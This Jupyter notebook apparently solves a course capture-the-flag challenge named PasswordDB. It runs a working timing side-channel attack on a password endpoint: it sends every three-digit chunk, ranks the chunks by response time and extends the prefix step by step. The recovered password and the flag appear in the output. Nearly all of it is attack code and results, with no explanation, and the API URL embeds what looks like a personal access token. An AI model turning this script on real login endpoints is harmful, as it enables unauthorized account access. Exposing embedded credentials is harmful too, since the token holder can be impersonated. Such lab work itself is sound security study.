{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 68,
      "metadata": {},
      "outputs": [],
      "source": [
        "import requests\n",
        "import time\n",
        "\n",
        "# API endpoint and token configuration\n",
        "API_URL = \"https://cyber210.network/api/challenges/PasswordDB?token=guang_yang.7cS3o5zwlL0_kpmA2joEIKhDDLo\"\n",
        "CHUNK_LENGTH = 3  # Each password segment has 3 digits\n",
        "CHUNK_RANGE = range(1000)  # Each segment can range from 000 to 999\n",
        "\n",
        "def test_chunk_value_0(chunk_value):\n",
        "    \"\"\"\n",
        "    Test a single chunk value for chunk 0 and measure response time.\n",
        "\n",
        "    Args:\n",
        "        chunk_value (str): The 3-digit chunk value to test.\n",
        "\n",
        "    Returns:\n",
        "        tuple: (chunk_value, elapsed_time)\n",
        "    \"\"\"\n",
        "    password = chunk_value + \"000000000\"  # Placeholder password with chunk 0 tested\n",
        "    try:\n",
        "        start_time = time.time()\n",
        "        response = requests.post(API_URL, data={\"password\": password}, timeout=5)\n",
        "        elapsed_time = time.time() - start_time\n",
        "        return chunk_value, elapsed_time\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        print(f\"Request failed for chunk {chunk_value}: {e}\")\n",
        "        return chunk_value, float(\"inf\")\n",
        "\n",
        "def test_chunk_value_1(best_chunk,chunk_value):\n",
        "    \"\"\"\n",
        "    Test a single chunk value for chunk 0 and measure response time.\n",
        "\n",
        "    Args:\n",
        "        chunk_value (str): The 3-digit chunk value to test.\n",
        "\n",
        "    Returns:\n",
        "        tuple: (chunk_value, elapsed_time)\n",
        "    \"\"\"\n",
        "    password = best_chunk +chunk_value + \"000000\"  # Placeholder password with chunk 0 tested\n",
        "    try:\n",
        "        start_time = time.time()\n",
        "        response = requests.post(API_URL, data={\"password\": password}, timeout=5)\n",
        "        elapsed_time = time.time() - start_time\n",
        "        return chunk_value, elapsed_time\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        print(f\"Request failed for chunk {chunk_value}: {e}\")\n",
        "        return chunk_value, float(\"inf\")\n",
        "def test_chunk_value_2(best_chunk,chunk_value):\n",
        "    \"\"\"\n",
        "    Test a single chunk value for chunk 0 and measure response time.\n",
        "\n",
        "    Args:\n",
        "        chunk_value (str): The 3-digit chunk value to test.\n",
        "\n",
        "    Returns:\n",
        "        tuple: (chunk_value, elapsed_time)\n",
        "    \"\"\"\n",
        "    password = best_chunk +chunk_value + \"000\"  # Placeholder password with chunk 0 tested\n",
        "    try:\n",
        "        start_time = time.time()\n",
        "        response = requests.post(API_URL, data={\"password\": password}, timeout=5)\n",
        "        elapsed_time = time.time() - start_time\n",
        "        return chunk_value, elapsed_time\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        print(f\"Request failed for chunk {chunk_value}: {e}\")\n",
        "        return chunk_value, float(\"inf\")\n",
        "def test_chunk_value_3(best_chunk,chunk_value):\n",
        "    \"\"\"\n",
        "    Test a single chunk value for chunk 0 and measure response time.\n",
        "\n",
        "    Args:\n",
        "        chunk_value (str): The 3-digit chunk value to test.\n",
        "\n",
        "    Returns:\n",
        "        tuple: (chunk_value, elapsed_time)\n",
        "    \"\"\"\n",
        "    password = best_chunk +chunk_value # Placeholder password with chunk 0 tested\n",
        "    try:\n",
        "        start_time = time.time()\n",
        "        response = requests.post(API_URL, data={\"password\": password}, timeout=5)\n",
        "        if b'Invalid password.' not in response.content:\n",
        "            print(response.content)\n",
        "            print(f\"password : {best_chunk}{chunk_value}\")\n",
        "\n",
        "        elapsed_time = time.time() - start_time\n",
        "        return chunk_value, elapsed_time\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        print(f\"Request failed for chunk {chunk_value}: {e}\")\n",
        "        return chunk_value, float(\"inf\")\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {},
      "outputs": [
        {
          "data": {
            "text/plain": [
              "[('009', 0.7830209732055664),\n",
              " ('391', 0.7046318054199219),\n",
              " ('106', 0.7015678882598877),\n",
              " ('030', 0.69344162940979),\n",
              " ('020', 0.6143531799316406),\n",
              " ('117', 0.5972793102264404),\n",
              " ('701', 0.5831491947174072),\n",
              " ('676', 0.555079460144043),\n",
              " ('000', 0.5265634059906006),\n",
              " ('171', 0.5255565643310547)]"
            ]
          },
          "execution_count": 3,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "def find_top_10_chunks_0():\n",
        "    \"\"\"\n",
        "    Test all possible values for chunk 0 sequentially\n",
        "    and return the 10 values with the highest response times.\n",
        "\n",
        "    Returns:\n",
        "        list: Top 10 chunk values with their response times.\n",
        "    \"\"\"\n",
        "    chunk_values = [f\"{i:03}\" for i in CHUNK_RANGE]  # Generate all 3-digit combinations\n",
        "    results = []\n",
        "\n",
        "    # Sequentially test each chunk value\n",
        "    for chunk_value in chunk_values:\n",
        "        result = test_chunk_value_0(chunk_value)\n",
        "        results.append(result)\n",
        "\n",
        "    # Sort results by response time in descending order\n",
        "    sorted_results = sorted(results, key=lambda x: x[1], reverse=True)\n",
        "\n",
        "    # Return the top 10 results\n",
        "    return sorted_results[:10]\n",
        "find_top_10_chunks_0()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 19,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Testing candidate 391: HTTP Status: 401, Elapsed time: 0.7472 seconds\n",
            "Testing candidate 391: HTTP Status: 401, Elapsed time: 0.7032 seconds\n",
            "Testing candidate 391: HTTP Status: 401, Elapsed time: 0.7244 seconds\n"
          ]
        }
      ],
      "source": [
        "best_chunk=\"391\"\n",
        "for i in range(0, 3):\n",
        "    # Format the current candidate password segment\n",
        "   \n",
        "    password = f\"{best_chunk}000000000\"  # Insert the candidate segment into the password\n",
        "\n",
        "    # Record the start time\n",
        "    start_time = time.time()\n",
        "\n",
        "    try:\n",
        "        # Send the POST request\n",
        "        response = requests.post(API_URL, data={\"password\": password}, timeout=5)\n",
        "\n",
        "        # Record the end time\n",
        "        end_time = time.time()\n",
        "\n",
        "        # Calculate the elapsed time\n",
        "        elapsed_time = end_time - start_time\n",
        "\n",
        "        # Print the HTTP status code and elapsed time\n",
        "        http_code = response.status_code\n",
        "        print(f\"Testing candidate {best_chunk}: HTTP Status: {http_code}, Elapsed time: {elapsed_time:.4f} seconds\")\n",
        "\n",
        "        # If the correct password is found (HTTP 200), exit the loop\n",
        "        if http_code == 200:\n",
        "            print(f\"Password cracked! Correct candidate: {password}\")\n",
        "            break\n",
        "\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        # Handle any network-related errors\n",
        "        print(f\"Error testing candidate {e}\")\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 14,
      "metadata": {},
      "outputs": [
        {
          "data": {
            "text/plain": [
              "[('732', 0.9760348796844482),\n",
              " ('226', 0.773611307144165),\n",
              " ('014', 0.7729737758636475),\n",
              " ('049', 0.7716474533081055),\n",
              " ('303', 0.7638497352600098),\n",
              " ('134', 0.7626843452453613),\n",
              " ('113', 0.7614166736602783),\n",
              " ('594', 0.7611870765686035),\n",
              " ('488', 0.7609169483184814),\n",
              " ('778', 0.7605290412902832)]"
            ]
          },
          "execution_count": 14,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "def find_top_10_chunks_1():\n",
        "    \"\"\"\n",
        "    Test all possible values for chunk 0 sequentially\n",
        "    and return the 10 values with the highest response times.\n",
        "\n",
        "    Returns:\n",
        "        list: Top 10 chunk values with their response times.\n",
        "    \"\"\"\n",
        "    chunk_values = [f\"{i:03}\" for i in CHUNK_RANGE]  # Generate all 3-digit combinations\n",
        "    results = []\n",
        "\n",
        "    # Sequentially test each chunk value\n",
        "    for chunk_value in chunk_values:\n",
        "        result = test_chunk_value_1(best_chunk,chunk_value)\n",
        "        results.append(result)\n",
        "\n",
        "    # Sort results by response time in descending order\n",
        "    sorted_results = sorted(results, key=lambda x: x[1], reverse=True)\n",
        "\n",
        "    # Return the top 10 results\n",
        "    return sorted_results[:10]\n",
        "find_top_10_chunks_1()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 23,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Testing candidate 391732: HTTP Status: 401, Elapsed time: 0.9384 seconds\n",
            "Testing candidate 391732: HTTP Status: 401, Elapsed time: 0.9807 seconds\n",
            "Testing candidate 391732: HTTP Status: 401, Elapsed time: 0.9566 seconds\n"
          ]
        }
      ],
      "source": [
        "best_chunk=\"391732\"\n",
        "for i in range(0, 3):\n",
        "    # Format the current candidate password segment\n",
        "   \n",
        "    password = f\"{best_chunk}000000\"  # Insert the candidate segment into the password\n",
        "\n",
        "    # Record the start time\n",
        "    start_time = time.time()\n",
        "\n",
        "    try:\n",
        "        # Send the POST request\n",
        "        response = requests.post(API_URL, data={\"password\": password}, timeout=5)\n",
        "\n",
        "        # Record the end time\n",
        "        end_time = time.time()\n",
        "\n",
        "        # Calculate the elapsed time\n",
        "        elapsed_time = end_time - start_time\n",
        "\n",
        "        # Print the HTTP status code and elapsed time\n",
        "        http_code = response.status_code\n",
        "        print(f\"Testing candidate {best_chunk}: HTTP Status: {http_code}, Elapsed time: {elapsed_time:.4f} seconds\")\n",
        "\n",
        "        # If the correct password is found (HTTP 200), exit the loop\n",
        "        if http_code == 200:\n",
        "            print(f\"Password cracked! Correct candidate: {password}\")\n",
        "            break\n",
        "\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        # Handle any network-related errors\n",
        "        print(f\"Error testing candidate {e}\")\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 24,
      "metadata": {},
      "outputs": [
        {
          "data": {
            "text/plain": [
              "[('998', 1.9624779224395752),\n",
              " ('577', 1.227900743484497),\n",
              " ('995', 1.2233641147613525),\n",
              " ('318', 1.2011494636535645),\n",
              " ('040', 1.1867282390594482),\n",
              " ('026', 1.1077473163604736),\n",
              " ('667', 1.0968472957611084),\n",
              " ('187', 1.0966300964355469),\n",
              " ('338', 1.0897290706634521),\n",
              " ('904', 1.075803279876709)]"
            ]
          },
          "execution_count": 24,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "def find_top_10_chunks_2():\n",
        "    \"\"\"\n",
        "    Test all possible values for chunk 0 sequentially\n",
        "    and return the 10 values with the highest response times.\n",
        "\n",
        "    Returns:\n",
        "        list: Top 10 chunk values with their response times.\n",
        "    \"\"\"\n",
        "    chunk_values = [f\"{i:03}\" for i in CHUNK_RANGE]  # Generate all 3-digit combinations\n",
        "    results = []\n",
        "\n",
        "    # Sequentially test each chunk value\n",
        "    for chunk_value in chunk_values:\n",
        "        result = test_chunk_value_2(best_chunk,chunk_value)\n",
        "        results.append(result)\n",
        "\n",
        "    # Sort results by response time in descending order\n",
        "    sorted_results = sorted(results, key=lambda x: x[1], reverse=True)\n",
        "\n",
        "    # Return the top 10 results\n",
        "    return sorted_results[:10]\n",
        "find_top_10_chunks_2()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 64,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Testing candidate 391732577: HTTP Status: 401, Elapsed time: 1.1905 seconds\n",
            "Testing candidate 391732577: HTTP Status: 401, Elapsed time: 1.2131 seconds\n",
            "Testing candidate 391732577: HTTP Status: 401, Elapsed time: 1.1871 seconds\n"
          ]
        }
      ],
      "source": [
        "best_chunk=\"391732577\"\n",
        "for i in range(0, 3):\n",
        "    # Format the current candidate password segment\n",
        "   \n",
        "    password = f\"{best_chunk}000\"  # Insert the candidate segment into the password\n",
        "\n",
        "    # Record the start time\n",
        "    start_time = time.time()\n",
        "\n",
        "    try:\n",
        "        # Send the POST request\n",
        "        response = requests.post(API_URL, data={\"password\": password}, timeout=5)\n",
        "\n",
        "        # Record the end time\n",
        "        end_time = time.time()\n",
        "\n",
        "        # Calculate the elapsed time\n",
        "        elapsed_time = end_time - start_time\n",
        "\n",
        "        # Print the HTTP status code and elapsed time\n",
        "        http_code = response.status_code\n",
        "        print(f\"Testing candidate {best_chunk}: HTTP Status: {http_code}, Elapsed time: {elapsed_time:.4f} seconds\")\n",
        "\n",
        "        # If the correct password is found (HTTP 200), exit the loop\n",
        "        if http_code == 200:\n",
        "            print(f\"Password cracked! Correct candidate: {password}\")\n",
        "            break\n",
        "\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        # Handle any network-related errors\n",
        "        print(f\"Error testing candidate {e}\")\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 69,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "b'{\"flag\": \"__flag__{ac6f9cee948344776c02c548dea0c32a}\"}'\n",
            "password : 391732577793\n"
          ]
        }
      ],
      "source": [
        "def find_top_10_chunks_3():\n",
        "    \"\"\"\n",
        "    Test all possible values for chunk 0 sequentially\n",
        "    and return the 10 values with the highest response times.\n",
        "\n",
        "    Returns:\n",
        "        list: Top 10 chunk values with their response times.\n",
        "    \"\"\"\n",
        "    chunk_values = [f\"{i:03}\" for i in CHUNK_RANGE]  # Generate all 3-digit combinations\n",
        "    results = []\n",
        "\n",
        "    # Sequentially test each chunk value\n",
        "    for chunk_value in chunk_values:\n",
        "        result = test_chunk_value_3(best_chunk,chunk_value)\n",
        "        results.append(result)\n",
        "\n",
        "    # Sort results by response time in descending order\n",
        "    sorted_results = sorted(results, key=lambda x: x[1], reverse=True)\n",
        "\n",
        "    # Return the top 10 results\n",
        "    return sorted_results\n",
        "rst=find_top_10_chunks_3()\n",
        "\n"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "toc_visible": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.12.1"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
